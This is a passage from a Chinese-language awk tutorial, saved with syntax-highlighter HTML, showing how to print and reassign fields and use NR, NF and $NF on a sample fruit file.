class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $1, $2, $3}' fruit.txt\r\npeach 100 Mar\r\nLemon 150 Jan\r\nPear 240 Mar\r\navocado 120 Feb</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af94175501090-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af94175501090-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af94175501090-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af94175501090-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af94175501090-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af94175501090-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $1, $2, $3}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af94175501090-2\"><span class=\"crayon-i\">peach</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Mar</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af94175501090-3\"><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Jan</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af94175501090-4\"><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Mar</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af94175501090-5\"><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Feb</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>其中加入的逗号表示插入输出分隔符，也就是默认的空格</p>\n<p><strong>文件的每一行的每一列的内容除了可以用 print 命令打印输出以外，还可以对其进行赋值</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af97025312343\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{$2 = \"***\"; print $0}' fruit.txt\r\npeach *** Mar 1997 China\r\nLemon *** Jan 1986 America\r\nPear *** Mar 1990 Janpan\r\navocado *** Feb 2008 china</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af97025312343-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af97025312343-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af97025312343-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af97025312343-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af97025312343-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af97025312343-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{$2 = \"***\"; print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af97025312343-2\"><span class=\"crayon-e \">peach *</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af97025312343-3\"><span class=\"crayon-e \">Lemon *</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af97025312343-4\"><span class=\"crayon-e \">Pear *</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af97025312343-5\"><span class=\"crayon-e \">avocado *</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>上面的例子就是表示通过对 <code>$2</code> 变量进行重新赋值，来隐藏每一行的第 2 列内容，并且用星号 <code>*</code> 来代替其输出</p>\n<p><strong>在参数列表中加入一些字符串或者转义字符之类的东东</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af9b456468026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $1 \"\\t\" $2 \"\\t\" $3}' fruit.txt\r\npeach   100     Mar\r\nLemon   150     Jan\r\nPear    240     Mar\r\navocado 120     Feb</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9b456468026-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af9b456468026-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9b456468026-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af9b456468026-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9b456468026-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af9b456468026-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $1 \"\\t\" $2 \"\\t\" $3}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af9b456468026-2\"><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">     </span><span class=\"crayon-e\">Mar</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af9b456468026-3\"><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">     </span><span class=\"crayon-e\">Jan</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af9b456468026-4\"><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">     </span><span class=\"crayon-e\">Mar</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af9b456468026-5\"><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">     </span><span class=\"crayon-v\">Feb</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>像上面这样，你可以在 <code>print</code>的参数列表中加入一些字符串或者转义字符之类的东东，让输出的内容格式更漂亮，但一定要记住要使用双引号。</p>\n<p><strong>awk 内置 NR 变量表示每一行的行号</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2af9e274944870\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print NR \"\\t\" $0}' fruit.txt\r\n1   peach    100   Mar  1997   China\r\n2   Lemon    150   Jan  1986   America\r\n3   Pear     240   Mar  1990   Janpan\r\n4   avocado  120   Feb  2008   china</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9e274944870-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af9e274944870-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9e274944870-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2af9e274944870-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2af9e274944870-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2af9e274944870-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print NR \"\\t\" $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af9e274944870-2\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af9e274944870-3\"><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2af9e274944870-4\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2af9e274944870-5\"><span class=\"crayon-cn\">4</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><strong>awk 内置 NF 变量表示每一行的列数</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afa1227619530\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print NF \"\\t\" $0}' fruit.txt\r\n5   peach    100   Mar  1997   China\r\n5   Lemon    150   Jan  1986   America\r\n5   Pear     240   Mar  1990   Janpan\r\n5   avocado  120   Feb  2008   china</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa1227619530-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa1227619530-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa1227619530-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa1227619530-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa1227619530-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afa1227619530-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print NF \"\\t\" $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa1227619530-2\"><span class=\"crayon-cn\">5</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa1227619530-3\"><span class=\"crayon-cn\">5</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa1227619530-4\"><span class=\"crayon-cn\">5</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa1227619530-5\"><span class=\"crayon-cn\">5</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><strong>awk 中 $NF 变量的使用</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afa4128723483\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $NF}' fruit.txt\r\nChina\r\nAmerica\r\nJanpan\r\nchina</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa4128723483-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa4128723483-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa4128723483-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa4128723483-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa4128723483-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afa4128723483-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $NF}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa4128723483-2\"><span class=\"crayon-e\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa4128723483-3\"><span class=\"crayon-e\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa4128723483-4\"><span class=\"crayon-e\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa4128723483-5\"><span class=\"crayon-v\">china</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上面这个 <code>$NF</code> 就表示每一行的最后一列，因为 NF 表示一行的总列数，在这个文件里表示有 5 列，然后在其前面加上 <code>$</code> 符号，就变成了 <code>$5</code> ，表示第 5 列</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afa7679060798\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div 